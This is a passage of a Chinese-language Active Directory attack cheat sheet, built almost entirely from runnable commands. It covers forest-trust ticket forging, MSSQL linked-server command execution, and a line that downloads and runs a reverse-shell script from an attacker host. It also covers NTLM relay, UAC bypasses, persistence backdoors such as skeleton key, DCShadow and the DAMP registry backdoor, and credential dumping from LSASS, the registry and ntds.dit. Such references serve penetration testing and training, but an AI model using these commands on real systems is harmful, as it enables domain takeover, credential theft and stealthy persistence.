+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainForeignGroupMember -domain corp2.com</span><br></pre></td></tr></table></figure>
+<p>在某些情况下，可能会在林之间<em>禁用</em>SID过滤（导致上述情况的保护）。如果您运行<code>Get-DomainTrust</code>并看到该<code>TREAT_AS_EXTERNAL</code>属性，便是这种情况！在这种情况下，如上所述，您可以像域信任一样滥用目录林信任。请注意，您仍然可以<em>不</em>伪造车票500和1000之间的任何SID的，所以你不能成为DA（甚至没有间接通过组继承）。在这种情况下，寻找在域控制器上授予本地管理员或类似非域特权的组。有关更多信息，请参阅<a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" target="_blank" rel="noopener">此博客文章</a>。</p>
+<p>要模拟来自我们源域的用户以访问外部域中的服务，我们可以执行以下操作。如上述“使用域信任密钥”中那样提取林间信任密钥。</p>
+<p>使用Mimikatz通过信任密钥为目标域生成TGT：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::golden /user:Administrator /service:krbtgt /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:eurocorp.local /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:eucorp-tgt.kirbi</span><br></pre></td></tr></table></figure>
+<p>然后，使用Rubeus<code>CIFS</code>使用该TGT向TGS询问例如目标DC上的服务。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt</span><br></pre></td></tr></table></figure>
+<p>现在，我们可以将目标林的DC上的CIFS服务用作源域的DA（同样，只要此信任关系已配置为存在）。</p>
+<h3 id="滥用MSSQL数据库进行横向移动"><a href="#滥用MSSQL数据库进行横向移动" class="headerlink" title="滥用MSSQL数据库进行横向移动"></a>滥用MSSQL数据库进行横向移动</h3><p>可以链接MSSQL数据库，这样，如果您破坏了一个数据库，则可以在特定用户（<code>sa</code>也许是）的上下文中对其他数据库执行查询（甚至命令！）。这甚至可以跨森林工作！如果执行SQL，则可以使用以下命令枚举数据库链接。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查找链接的服务器</span></span><br><span class="line">EXEC sp_linkedservers</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在链接服务器上运行SQL查询</span></span><br><span class="line"><span class="keyword">select</span> mylogin <span class="keyword">from</span> openquery(<span class="string">"dc01"</span>, <span class="string">'select SYSTEM_USER as mylogin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在远程服务器上启用“ xp_cmdshell”并执行命令</span></span><br><span class="line">EXEC (<span class="string">'sp_configure ''show advanced options'', 1; reconfigure'</span>) <span class="keyword">AT</span> DC01</span><br><span class="line">EXEC (<span class="string">'sp_configure ''xp_cmdshell'', 1; reconfigure'</span>) <span class="keyword">AT</span> DC01</span><br><span class="line">EXEC (<span class="string">'xp_cmdshell ''whoami'' '</span>) <span class="keyword">AT</span> DC01</span><br></pre></td></tr></table></figure>
+<p>我们还可以使用<a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">PowerUpSQL</a>在域中查找数据库，并收集有关（可达）数据库的更多信息。我们还可以自动在链接的数据库中查找并执行查询或命令（甚至通过多层数据库链接）。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取域中的MSSQL数据库，并测试连通性</span></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试获取所有域数据库上的信息</span></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLServerInfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在单个可访问的数据库上获取信息</span></span><br><span class="line">Get-SQLServerInfo -Instance dcorp-mssql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描MSSQL错误配置以升级到SA</span></span><br><span class="line">Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL查询</span></span><br><span class="line">Get-SQLQuery -Query <span class="string">"SELECT system_user"</span> -Instance UFC-SQLDEV</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行命令（需要启用XP_CMDSHELL）</span></span><br><span class="line">Invoke-SQLOSCmd -Instance devsrv -Command <span class="string">"whoami"</span> |  select -ExpandProperty CommandResults</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动查找所有链接的数据库</span></span><br><span class="line">Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果在任何链接的数据库上启用了XP_CMDSHELL，则运行命令</span></span><br><span class="line">Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query <span class="string">'EXEC xp_cmdshell "whoami"'</span> | select instance,links,customquery | ft</span><br><span class="line"></span><br><span class="line">Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query <span class="string">'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring('</span><span class="string">'http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'</span><span class="string">')"'</span> | select instance,links,customquery | ft</span><br></pre></td></tr></table></figure>
+<p>如果您具有对MSSQL数据库的低特权访问权限，并且不存在任何链接，则有可能通过使用<code>xp_dirtree</code>存储过程访问此共享来强制执行NTLM身份验证。如果成功，则可以收集SQL服务帐户的NetNTLM，并可能将其破解或中继，以破坏作为该服务帐户的计算机。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_dirtree "\\192.168.49.67\share"</span><br></pre></td></tr></table></figure>
+<p>中继哈希以通过身份验证为本地admin的示例命令（如果服务帐户具有这些特权）并运行<code>calc.exe</code>。忽略该<code>-c</code>参数尝试尝试<code>secretsdump</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c <span class="string">'calc.exe'</span></span><br></pre></td></tr></table></figure>
+<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><p>有关更多信息（包括Windows和Linux），请参阅我的<a href="https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/" target="_blank" rel="noopener">OSCP备忘单和命令参考</a>。</p>
+<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查易受攻击的程序和配置</span></span><br><span class="line">Invoke-AllChecks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用易受攻击的服务权限（不需要触摸磁盘）</span></span><br><span class="line">Invoke-ServiceAbuse -Name <span class="string">"AbyssWebServer"</span> -Command <span class="string">"net localgroup Administrators domain\user /add"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用易受攻击的服务权限触发稳定的beacon</span></span><br><span class="line">Write-ServiceBinary -Name <span class="string">'AbyssWebServer'</span> -Command <span class="string">'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update'</span> -Path <span class="string">'C:\WebServer\Abyss'</span></span><br><span class="line">net stop AbyssWebServer</span><br><span class="line">net start AbyssWebServer</span><br></pre></td></tr></table></figure>
+<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass  UAC"></a>Bypass  UAC</h3><p>使用<a href="https://github.com/FatRodzianko/SharpBypassUAC" target="_blank" rel="noopener">SharpBypassUAC</a>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成EncodedCommand</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update'</span> | base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 SharpBypassUAC e.g. 从CobaltStrike 的一个beacon</span></span><br><span class="line">beacon&gt; execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==</span><br></pre></td></tr></table></figure>
+<p>在某些情况下，运行手动Bypass  UAC （例如FODHelper bypass）可能会变得更好，而FODHelper旁路在PowerShell中执行起来非常简单。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The command to execute in high integrity context</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">"cmd /c start powershell.exe"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set the registry values</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> -Force</span><br><span class="line"><span class="built_in">New-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> -Name <span class="string">"DelegateExecute"</span> -Value <span class="string">""</span> -Force</span><br><span class="line"><span class="built_in">Set-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> -Name <span class="string">"(default)"</span> -Value <span class="variable">$cmd</span> -Force</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Trigger fodhelper to perform the bypass</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">"C:\Windows\System32\fodhelper.exe"</span> -WindowStyle Hidden</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Clean registry</span></span><br><span class="line"><span class="built_in">Start-Sleep</span> <span class="number">3</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="string">"HKCU:\Software\Classes\ms-settings\"</span> -Recurse -Force</span><br></pre></td></tr></table></figure>
+<h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2><h3 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h3><p>只需删除一个二进制文件即可。经典😎🚩</p>
+<p>在当前用户文件夹中，将在当前用户登录时触发：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+<p>或在启动文件夹中，需要管理特权，但在启动时<em>以及</em>任何用户登录时将以SYSTEM身份触发：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure>
+<h2 id="域持久性"><a href="#域持久性" class="headerlink" title="域持久性"></a>域持久性</h2><p>必须以DA特权运行。</p>
+<h3 id="Mimikatz万能钥匙攻击"><a href="#Mimikatz万能钥匙攻击" class="headerlink" title="Mimikatz万能钥匙攻击"></a>Mimikatz万能钥匙攻击</h3><p>从DC运行。为所有用户🚩启用密码“ mimikatz”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+<h3 id="使用PowerView授予特定的用户DCSync权限"><a href="#使用PowerView授予特定的用户DCSync权限" class="headerlink" title="使用PowerView授予特定的用户DCSync权限"></a>使用PowerView授予特定的用户DCSync权限</h3><p>随时为您提供用户选择的DCSync权限。在某些设置中可能会逃避检测。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ObjectACL -TargetDistinguishedName <span class="string">"dc=dollarcorp,dc=moneycorp,dc=local"</span> -PrincipalSamAccountName student355 -Rights DCSync</span><br></pre></td></tr></table></figure>
+<h3 id="域控制器DSRM管理员"><a href="#域控制器DSRM管理员" class="headerlink" title="域控制器DSRM管理员"></a>域控制器DSRM管理员</h3><p>DSRM管理员是DC的本地管理员帐户。首先需要启用远程登录。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> -Name <span class="string">"DsrmAdminLogonBehavior"</span> -Value <span class="number">2</span> -PropertyType DWORD</span><br></pre></td></tr></table></figure>
+<p>现在，我们可以使用之前转储在DC上的本地管理哈希值远程登录（使用<code>lsadump::sam</code>，请参见下面的“使用Mimikatz转储秘密”）。使用例如“越过哈希”来获得会话（请参见上面的“ Mimikatz”）。</p>
+<h3 id="修改安全描述符以进行远程WMI访问"><a href="#修改安全描述符以进行远程WMI访问" class="headerlink" title="修改安全描述符以进行远程WMI访问"></a>修改安全描述符以进行远程WMI访问</h3><p>使用<code>Set-RemoteWMI.ps1</code>cmdlet向用户WMI访问计算机。可以运行以持久访问例如DC。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace <span class="string">'root\cimv2'</span></span><br></pre></td></tr></table></figure>
+<p>有关执行，请参见上面的“使用WMI执行命令”。</p>
+<h3 id="修改PowerShell远程访问的安全描述符"><a href="#修改PowerShell远程访问的安全描述符" class="headerlink" title="修改PowerShell远程访问的安全描述符"></a>修改PowerShell远程访问的安全描述符</h3><p>使用<code>Set-RemotePSRemoting.ps1</code>cmdlet向用户PowerShell远程访问计算机。可以运行以持久访问例如DC。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>
+<p>有关执行，请参见上面的“使用PowerShell Remoting执行命令”。</p>
+<h3 id="修改DC注册表安全描述符以使用DAMP进行远程哈希检索"><a href="#修改DC注册表安全描述符以使用DAMP进行远程哈希检索" class="headerlink" title="修改DC注册表安全描述符以使用DAMP进行远程哈希检索"></a>修改DC注册表安全描述符以使用DAMP进行远程哈希检索</h3><p>使用<a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="noopener">DAMP工具</a>，我们就可以借壳DC注册表来给我们上的访问<code>SAM</code>，<code>SYSTEM</code>以及<code>SECURITY</code>注册表配置单元。这使我们能够远程转储DC机密（哈希）。</p>
+<p>我们使用<code>Add-RemoteRegBackdoor.ps1</code>来自DAMP的cmdlet添加后门。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee Student355</span><br></pre></td></tr></table></figure>
+<p>使用<code>RemoteHashRetrieval.ps1</code>DAMP中的cmdlet远程转储秘密（以“受信任”用户身份运行）。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取针对银票攻击的机器帐户哈希</span></span><br><span class="line">Get-RemoteMachineAccountHash -ComputerName dcorp-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取本地帐户哈希</span></span><br><span class="line">Get-RemoteLocalAccountHash -ComputerName dcorp-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取缓存的凭据（如果有）</span></span><br><span class="line">Get-RemoteCachedCredential -ComputerName dcorp-dc</span><br></pre></td></tr></table></figure>
+<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow是一种通过临时模仿域控制器来掩盖某些动作的攻击。如果您在根域中具有Domain Admin或Enterprise Admin特权，则可以将其用于林级别的持久性。</p>
+<p>（可选）作为域管理员，为选定的用户提供DCShadow攻击所需的特权（使用<code>Set-DCShadowPermissions.ps1</code>cmdlet）。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DCShadowPermissions -FakeDC mcorp-student35 -SamAccountName root355user -Username student355 -Verbose</span><br></pre></td></tr></table></figure>
+<p>然后，在任何计算机上，使用Mimikatz进行DCShadow攻击。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 为用户设置SPN</span><br><span class="line">lsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:&quot;SuperHacker/ServicePrincipalThingey&quot;</span><br><span class="line"></span><br><span class="line"># 设置用户的SID历史记录（有效地授予他们企业管理员权限）</span><br><span class="line">lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519</span><br><span class="line"></span><br><span class="line"># 为用户设置AdminSDHolder容器上的完全控制权限</span><br><span class="line">## 需要检索当前的ACL：</span><br><span class="line">(New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local&quot;)).psbase.ObjectSecurity.sddl</span><br><span class="line"></span><br><span class="line">## 然后获取目标用户的SID：</span><br><span class="line">Get-NetUser -UserName student355 | select objectsid</span><br><span class="line"></span><br><span class="line">## 最后，添加完全控制原语 (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user</span><br><span class="line">lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109)</span><br></pre></td></tr></table></figure>
+<p>最后，从DA会话或以前提供DCShadowPermissions的用户的会话中，运行DCShadow攻击。先前上演的动作将在不保留日志的情况下执行😈</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcshadow /push</span><br></pre></td></tr></table></figure>
+<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h2><h3 id="LSASS保护"><a href="#LSASS保护" class="headerlink" title="LSASS保护"></a>LSASS保护</h3><p>有时，LSASS被配置为作为受保护进程（PPL）运行。您可以使用PowerShell进行查询，如下所示。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name <span class="string">"RunAsPPL"</span></span><br></pre></td></tr></table></figure>
+<p>在这种情况下，您不仅可以转储或解析LSASS，还需要使用禁用该保护<code>mimidrv.sys</code>。我不会在这里讨论如何做。</p>
+<h3 id="Dumping-secrets-with-Mimikatz"><a href="#Dumping-secrets-with-Mimikatz" class="headerlink" title="Dumping secrets with Mimikatz"></a>Dumping secrets with Mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 转储登录密码</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line"># 从DC转储所有域散列</span><br><span class="line">## 注意：带有/patch的所有内容都很嘈杂，因为它_writes_到LSASS🚩</span><br><span class="line">lsadump::lsa /patch</span><br><span class="line"></span><br><span class="line"># 仅转储本地用户</span><br><span class="line">lsadump::sam</span><br><span class="line"></span><br><span class="line"># DCSync (requires &apos;ldap&apos; SPN)</span><br><span class="line">lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>
+<p>Windows Credential Vault转储</p>
+<blockquote>
+<p>我在和一起使用时遇到了一些问题<code>Invoke-Mimikatz.ps1</code>。如果遇到问题，请尝试使用本机Mimikatz。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 转储Windows机密，例如计划任务的存储凭据（先提升权限）</span><br><span class="line">vault::list</span><br><span class="line">vault::cred /patch</span><br><span class="line"></span><br><span class="line"># 转储Windows机密DPAPI方法（噪音少，没有特定权限，需要）</span><br><span class="line">## 更多信息: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials</span><br><span class="line">## 首先，获取特定密钥的主密钥的GUID</span><br><span class="line">dpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line"></span><br><span class="line">## LSASS的EITHER Grab dpapi键</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">## 或抓取并缓存特定密钥</span><br><span class="line">dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b</span><br><span class="line"></span><br><span class="line">## Mimikatz将缓存主密钥（使用dpapi::cache检查）</span><br><span class="line">## Then run the initial dpapi::cred command again to get the juice!</span><br></pre></td></tr></table></figure>
+<h3 id="没有Mimikatz的密码hash转储"><a href="#没有Mimikatz的密码hash转储" class="headerlink" title="没有Mimikatz的密码hash转储"></a>没有Mimikatz的密码hash转储</h3><p>我们也可以解析系统机密，而无需在目标系统上直接使用Mimikatz。</p>
+<h4 id="Dumping-LSASS"><a href="#Dumping-LSASS" class="headerlink" title="Dumping LSASS"></a>Dumping LSASS</h4><p>运行Mimikatz的首选方法是使用目标中LSASS内存的转储副本在本地进行。<a href="https://github.com/outflanknl/Dumpert" target="_blank" rel="noopener">Dumpert</a>，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">Procdump</a>或其他（自定义）工具可用于转储LSASS内存。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过进程快照（-r）转储LSASS内存，避免与之直接交互</span></span><br><span class="line">.\procdump.exe -r -ma lsass.exe lsass.dmp</span><br><span class="line"><span class="comment"># 或者任务管理器找到lsass.exe进程右键创建转储文件</span></span><br></pre></td></tr></table></figure>
+<p>在我们的攻击系统上下载内存转储文件后，我们可以运行Mimikatz并切换到“ Minidump”模式以如下方式解析文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+<h4 id="Dumping-secrets-from-the-registry"><a href="#Dumping-secrets-from-the-registry" class="headerlink" title="Dumping secrets from the registry"></a>Dumping secrets from the registry</h4><p>我们可以从注册表中转储机密并“离线”解析文件，以获取系统机密列表。🚩</p>
+<p>在目标上，我们运行以下命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg.exe save hklm\sam c:\users\public\downloads\sam.save</span><br><span class="line">reg.exe save hklm\system c:\users\public\downloads\system.save</span><br><span class="line">reg.exe save hklm\security c:\users\public\downloads\security.save</span><br></pre></td></tr></table></figure>
+<p>然后，在我们的攻击盒子上，我们可以使用Impacket丢弃秘密：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out</span><br></pre></td></tr></table></figure>
+<h4 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h4><p>ntdsutil win2008开始DC中自带的工具</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#交互式</span></span><br><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line">mount [GUID]</span><br><span class="line"><span class="comment"># copy 完之后再执行</span></span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 非交互式</span></span><br><span class="line">ntdsutil snapshot <span class="string">"activate instance ntds"</span> create quit quit</span><br><span class="line">ntdsutil snapshot <span class="string">"mount &#123;GUID&#125;"</span> quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot <span class="string">"unmount &#123;GUID&#125;"</span> <span class="string">"delete &#123;GUID&#125;"</span> quit quit</span><br></pre></td></tr></table></figure>
+<h4 id="QuarkPwDump分析-下载地址-https-github-com-quarkslab-quarkspwdump"><a href="#QuarkPwDump分析-下载地址-https-github-com-quarkslab-quarkspwdump" class="headerlink" title="QuarkPwDump分析 [下载地址][https://github.com/quarkslab/quarkspwdump]"></a>QuarkPwDump分析 [下载地址][<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a>]</h4><p>在线提取（直接在目标主机执行，实战中不选择此方式。）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit</span><br></pre></td></tr></table></figure>
+<p>离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt</span><br></pre></td></tr></table></figure>
+<h4 id="ntdsutil-ifm-模块"><a href="#ntdsutil-ifm-模块" class="headerlink" title="ntdsutil: ifm 模块"></a>ntdsutil: ifm 模块</h4><p>WINDOWS SERVER 2008-2016</p>
